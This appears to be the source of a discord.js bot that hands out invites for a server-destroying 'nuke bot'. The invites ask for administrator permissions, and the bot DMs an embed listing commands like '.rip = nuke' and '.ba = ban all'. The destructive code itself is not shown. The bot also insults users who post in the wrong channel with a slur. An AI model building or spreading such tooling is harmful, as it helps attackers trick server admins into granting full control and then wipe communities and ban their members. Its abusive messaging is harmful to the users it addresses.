const { Client, GatewayIntentBits, EmbedBuilder, Partials } = require('discord.js');
require('dotenv').config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages,
    ],
    partials: [Partials.Channel],
});

const OWNER_ID = '1336450372398612521';
const ALLOWED_CHANNEL_ID = '1390507210421043290';
const ALLOWED_SERVER_ID = '1345474714331643956';
const INVITE_LINK = 'https://discord.com/oauth2/authorize?client_id=1391678741717192807&permissions=8&integration_type=0&scope=bot';

const inviteCommands = ['!invite', ',invite', '?invite', '!bot', ',bot', '?bot'];

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
});

client.on('guildCreate', (guild) => {
    if (guild.id !== ALLOWED_SERVER_ID) {
        guild.leave()
            .then(() => console.log(`Left unauthorized server: ${guild.name}`))
            .catch(console.error);
    }
});

client.on('messageCreate', async (message) => {
    // Ignore DMs and bots
    if (!message.guild || message.author.bot) return;

    const content = message.content.toLowerCase();

    if (inviteCommands.some(cmd => content === cmd)) {
        if (message.channel.id !== ALLOWED_CHANNEL_ID) {
            try {
                await message.delete();
                await message.channel.send({ content: `<@${message.author.id}> CUNT only in <#1390507210421043290>`, ephemeral: true });
            } catch (err) {
                console.error("Could not delete message or reply:", err);
            }
            return;
        }

        const commandEmbed = new EmbedBuilder()
            .setTitle('Bot Commands')
            .setDescription([
                '`.rip = nuke`',
                '`.ba = ban all (not working rn)`',
                '`.help for in-bot help menu`'
            ].join('\n'))
            .setColor('#FF0000')
            .setFooter({ text: '⚠️ This is a nuke bot' });

        const inviteEmbed = new EmbedBuilder()
            .setDescription(`[Click here to invite me](${INVITE_LINK})`)
            .setColor('#00BFFF');

        try {
            await message.author.send({ embeds: [commandEmbed, inviteEmbed] });
            message.reply({ content: 'Sent you a DM!', ephemeral: true });
        } catch (err) {
            message.reply({ content: "I couldn't send you a DM. Please check your privacy settings.", ephemeral: true });
        }
    }

    // Owner-only commands
    if (message.author.id !== OWNER_ID) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'giverole') {
        const user = message.mentions.users.first();
        const role = message.mentions.roles.first();

        if (!user || !role) {
            return message.reply('Usage: `!giverole @user @role`');
        }

        const member = message.guild.members.cache.get(user.id);
        if (!member) return message.reply('User not found.');

        member.roles.add(role).catch(console.error);
        message.reply(`Gave ${role} to ${user.username}`);
    }

    if (command === 'addbot') {
        message.reply('This command is restricted.');
    }

    // Add more owner-only commands below
});

client.login(process.env.BOT_TOKEN);
